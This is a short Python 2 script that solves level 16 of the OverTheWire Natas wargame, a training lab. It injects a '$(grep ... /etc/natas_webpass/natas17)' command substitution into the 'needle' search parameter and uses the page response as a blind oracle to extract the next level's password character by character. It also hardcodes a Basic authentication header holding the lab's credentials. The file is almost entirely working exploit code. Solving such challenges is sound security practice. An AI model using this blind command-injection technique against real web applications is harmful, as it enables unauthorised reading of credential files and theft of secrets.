import requests

auth_header = {'Authorization':'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
alphanumerics = map(chr, range(65, 91) + range(97,123) + range(48, 58))

def make_url(string):
    return "http://natas16.natas.labs.overthewire.org/index.php?needle=hello$(grep -n " + string + " /etc/natas_webpass/natas17)"
def is_correct(string):
    print make_url(string)
    resp = requests.get(make_url(string), headers=auth_header).text
    return "hello" not in resp
# make a list of all possible characters
print "making a list of all characters in pw file..."
possible_chars = []
for char in alphanumerics:
    if is_correct(char):
        print char
        possible_chars.append(char)
# print out all possible characters
print possible_chars
# try to find the full password by appending possible characters to either end of the password we have so far
password = ""
while len(password) < 32:
    print "Password =", password
    for char in possible_chars:
        if is_correct(password + char): password = password + char
        if is_correct(char + password): password = char + password


print password
print "Woohoo!"
